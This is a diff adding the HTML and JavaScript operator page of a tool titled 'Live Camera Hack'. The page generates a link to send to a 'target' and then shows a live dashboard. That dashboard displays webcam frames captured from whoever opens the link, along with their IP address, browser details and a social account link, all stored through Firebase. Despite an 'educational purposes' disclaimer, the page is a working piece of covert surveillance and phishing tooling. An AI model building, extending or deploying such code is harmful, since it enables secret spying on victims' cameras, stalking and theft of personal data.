@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Camera Hack</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="config.js"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Banner -->
+        <div class="banner">
+            <h1>📷 Live Camera Hack</h1>
+            <h3>Developer Nawab Zada Hacker ☠️✌️🦅</h3>
+        </div>
+
+        <!-- Disclaimer -->
+        <div class="disclaimer">
+            ⚠️ This tool is only for Educational Purposes. Please don't use for wrong purposes.
+        </div>
+
+        <!-- Camera Selection -->
+        <div class="camera-selection">
+            <h2>Select Target Camera</h2>
+            <label>
+                <input type="radio" name="camera" value="front" checked> Front Camera
+            </label>
+            <label>
+                <input type="radio" name="camera" value="back"> Back Camera
+            </label>
+        </div>
+
+        <!-- Generate Link Button -->
+        <button id="generateBtn" class="btn-generate">🔗 Generate Hack Link</button>
+
+        <!-- Generated Link Display -->
+        <div id="linkContainer" class="link-container" style="display:none;">
+            <h2>✅ Link Generated Successfully!</h2>
+            <input type="text" id="generatedLink" readonly onclick="this.select(); navigator.clipboard?.writeText(this.value);">
+            <button id="copyBtn" class="btn-copy" onclick="copyLink()">📋 Copy Link</button>
+            <p class="note">Send this link to target. When they open it, camera will activate!</p>
+            <p class="note">Session ID: <span id="sessionIdDisplay"></span></p>
+        </div>
+
+        <!-- Loading -->
+        <div id="loading" class="loading" style="display:none;">
+            <div class="spinner"></div>
+            <p>Generating secure session...</p>
+        </div>
+
+        <!-- Dashboard (Live Camera Feed) -->
+        <div id="dashboardSection" class="dashboard-section" style="display:none;">
+            <h2>🔴 LIVE CAMERA FEED</h2>
+            <div class="status-bar">
+                <span id="targetStatus">⏳ Waiting for target...</span>
+                <span id="targetIpDisplay">🌐 IP: --</span>
+            </div>
+            <div class="video-container">
+                <img id="liveFeed" src="" alt="Waiting for camera feed...">
+                <div id="noFeedMsg" class="no-feed">🎥 Waiting for target to open link...</div>
+            </div>
+            <div class="target-info" id="targetInfo">
+                <p><strong>Service Selected:</strong> <span id="targetService">--</span></p>
+                <p><strong>Account Link:</strong> <span id="targetAccountLink">--</span></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // ===== GLOBALS =====
+    let currentSessionId = null;
+    let frameListener = null;
+    let metadataListener = null;
+    let dashboardFrameCount = 0;
+    const baseUrl = window.location.origin;
+
+    // ===== GENERATE LINK =====
+    document.getElementById('generateBtn').addEventListener('click', async function() {
+        const cameraType = document.querySelector('input[name="camera"]:checked').value;
+        
+        document.getElementById('loading').style.display = 'block';
+        document.getElementById('generateBtn').disabled = true;
+
+        // Generate unique session ID
+        currentSessionId = generateSessionId();
+        
+        // Get client's IP for dashboard reference
+        const myIp = await getClientIP();
+        
+        // Create session in Firebase
+        const sessionRef = database.ref('streams/' + currentSessionId);
+        await sessionRef.set({
+            metadata: {
+                creatorIp: myIp,
+                creatorUA: navigator.userAgent,
+                createdAt: firebase.database.ServerValue.TIMESTAMP,
+                cameraType: cameraType,
+                status: 'waiting', // waiting, active, completed
+                targetIp: null,
+                targetUA: null,
+                service: null,
+                socialLink: null
+            },
+            frameCount: 0,
+            createdAt: firebase.database.ServerValue.TIMESTAMP
+        });
+
+        // Register in admin
+        await database.ref('sessions/' + currentSessionId).set({
+            ip: myIp,
+            createdAt: firebase.database.ServerValue.TIMESTAMP,
+            status: 'waiting'
+        });
+
+        // Build the target link
+        const targetLink = baseUrl + '/target.html?session=' + currentSessionId + '&cam=' + cameraType;
+        const dashboardLink = baseUrl + '/dashboard.html?session=' + currentSessionId;
+
+        // Show link
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('linkContainer').style.display = 'block';
+        document.getElementById('generatedLink').value = targetLink;
+        document.getElementById('sessionIdDisplay').textContent = currentSessionId;
+
+        // Start dashboard monitoring
+        startDashboard(currentSessionId);
+    });
+
+    // ===== DASHBOARD MONITORING =====
+    function startDashboard(sessionId) {
+        document.getElementById('dashboardSection').style.display = 'block';
+        const sessionRef = database.ref('streams/' + sessionId);
+
+        // Listen for metadata changes (IP, service, etc.)
+        if (metadataListener) metadataListener.off();
+        metadataListener = sessionRef.child('metadata').on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (!data) return;
+
+            if (data.status === 'active') {
+                document.getElementById('targetStatus').textContent = '🔴 TARGET ONLINE - Camera Recording';
+                document.getElementById('targetStatus').style.color = '#ff0000';
+            } else if (data.status === 'waiting') {
+                document.getElementById('targetStatus').textContent = '⏳ Waiting for target...';
+                document.getElementById('targetStatus').style.color = '#ffaa00';
+            }
+
+            if (data.targetIp) {
+                document.getElementById('targetIpDisplay').textContent = '🌐 IP: ' + data.targetIp;
+            }
+            if (data.service) {
+                document.getElementById('targetService').textContent = data.service;
+            }
+            if (data.socialLink) {
+                document.getElementById('targetAccountLink').textContent = data.socialLink;
+            }
+        });
+
+        // Listen for frames
+        if (frameListener) frameListener.off();
+        dashboardFrameCount = 0;
+        frameListener = sessionRef.child('frames').on('value', (snapshot) => {
+            const frames = snapshot.val();
+            if (!frames) return;
+
+            // Get the latest frame
+            const frameKeys = Object.keys(frames).filter(k => k.startsWith('f'));
+            if (frameKeys.length === 0) return;
+            
+            frameKeys.sort((a, b) => {
+                const numA = parseInt(a.replace('f', ''));
+                const numB = parseInt(b.replace('f', ''));
+                return numB - numA;
+            });
+
+            const latestKey = frameKeys[0];
+            const latestFrame = frames[latestKey];
+            
+            if (latestFrame && latestFrame.data) {
+                document.getElementById('liveFeed').src = latestFrame.data;
+                document.getElementById('liveFeed').style.display = 'block';
+                document.getElementById('noFeedMsg').style.display = 'none';
+                dashboardFrameCount++;
+            }
+        });
+    }
+
+    // ===== UTILITY FUNCTIONS =====
+    function generateSessionId() {
+        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < 16; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return 'session_' + result + '_' + Date.now().toString(36);
+    }
+
+    async function getClientIP() {
+        try {
+            const resp = await fetch('/api/ip');
+            const data = await resp.json();
+            return data.ip || 'Unknown';
+        } catch(e) {
+            // Fallback to ipify
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                return data.ip || 'Unknown';
+            } catch(e2) {
+                return 'Unknown';
+            }
+        }
+    }
+
+    function copyLink() {
+        const linkInput = document.getElementById('generatedLink');
+        linkInput.select();
+        navigator.clipboard.writeText(linkInput.value).then(() => {
+            alert('✅ Link copied to clipboard!');
+        }).catch(() => {
+            alert('✅ Selected the link. Press Ctrl+C to copy.');
+        });
+    }
+    </script>
+</body>
+</html>
